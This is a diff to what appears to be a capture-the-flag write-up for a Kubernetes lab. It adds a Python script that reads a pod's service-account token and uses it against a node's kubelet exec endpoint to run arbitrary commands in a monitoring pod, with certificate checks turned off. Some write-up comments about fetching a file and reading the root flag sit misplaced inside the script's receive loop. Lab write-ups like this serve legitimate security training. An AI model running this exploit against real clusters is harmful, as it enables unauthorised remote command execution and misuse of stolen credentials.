@@ -189,10 +189,52 @@ After some API enumeration, we find our target IP for the exploit script.
 
 <img width="1270" height="108" alt="Screenshot From 2026-10-04 16-04-32" src="https://github.com/user-attachments/assets/6af4f86d-31ec-4fc6-9192-284a3607f021" />
 
-Now that we have the script, we can create the RCE payload.
+Now that we have the script, we can create the RCE exploit script.
 
 <img width="991" height="806" alt="Screenshot From 2026-10-04 16-03-44" src="https://github.com/user-attachments/assets/eaf98bdf-6047-4747-839b-2db3dae39e1f" />
+```python
+#!/usr/bin/env python3
+import asyncio, ssl, sys, websockets
 
+NODE = "10.129.154.131"
+NE_NS = "monitoring"
+NE_POD = "prometheus-prometheus-node-exporter-nmntq"
+NE_CNT = "node-exporter"
+TOKEN = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()
+COMMAND = sys.argv[1] if len(sys.argv) > 1 else 'id'
+
+async def ws_exec(cmd_parts):
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    
+    args = "&".join(f"command={part}" for part in cmd_parts)
+    url = (
+        f"wss://{NODE}:10250/exec/{NE_NS}/{NE_POD}/{NE_CNT}"
+        f"?output=1&error=1&{args}"
+    )
+    
+    async with websockets.connect(
+        url, ssl=ctx,
+        additional_headers={"Authorization": f"Bearer {TOKEN}"},
+        subprotocols=["v4.channel.k8s.io"],
+        open_timeout=10
+    ) as ws:
+        try:
+            while True:
+                data = await asyncio.wait_for(ws.recv(), timeout=5)
+                if isinstance(data, bytes) and len(data) > 1:
+                    # Then, we can transfer that file to the MCP pod using a simple Python server on our machine.
+                    # Then, we can fetch it from the pod.
+                    # Finally, we can read the root flag.
+                    sys.stdout.write(data[1:].decode("utf-8", errors="replace"))
+                    sys.stdout.flush()
+        except (asyncio.TimeoutError, websockets.exceptions.ConnectionClosed):
+            pass
+
+asyncio.run(ws_exec(COMMAND.split()))
+
+```
 I now read the root flag by calling the script with the parameter:
 
 ```bash
